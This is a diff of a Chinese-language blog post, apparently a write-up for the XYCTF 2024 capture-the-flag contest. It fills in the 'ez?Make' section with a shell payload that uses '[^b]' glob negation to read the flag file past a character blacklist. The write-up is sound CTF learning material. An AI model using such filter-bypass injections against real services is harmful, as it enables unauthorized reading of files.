@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">637字</span>
+        <span class="post-count">729字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">3分</span>
       </span>
     </span>
     
@@ -349,7 +349,16 @@ FLAG: ./flag
 
 <h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接访问&#x2F;flag就能下载了</p>
 <hr>
-<h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><p>别急</p>
+<h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><blockquote>
+<p>通配符匹配</p>
+</blockquote>
+<p>测试了一下，发现<code>l</code>、<code>a</code>这几个字母用不了了，应该是把 &#x2F;flag 这几个字符给ban了</p>
+<p>但是这次没删环境变量，所以可以直接任意地方执行命令</p>
+<p>接下来利用<code>[^]</code>通配符反向匹配flag</p>
+<p>最终payload：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">pwd</span><span class="token operator">&amp;&amp;</span><span class="token function">more</span> <span class="token punctuation">[</span>^b<span class="token punctuation">]</span><span class="token punctuation">[</span>^b<span class="token punctuation">]</span><span class="token punctuation">[</span>^b<span class="token punctuation">]</span><span class="token punctuation">[</span>^b<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430184326092.png" alt="image-20240430184326092"></p>
 <hr>
 <h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><blockquote>
 <p>Makefile 自动变量 + 报错读文件</p>
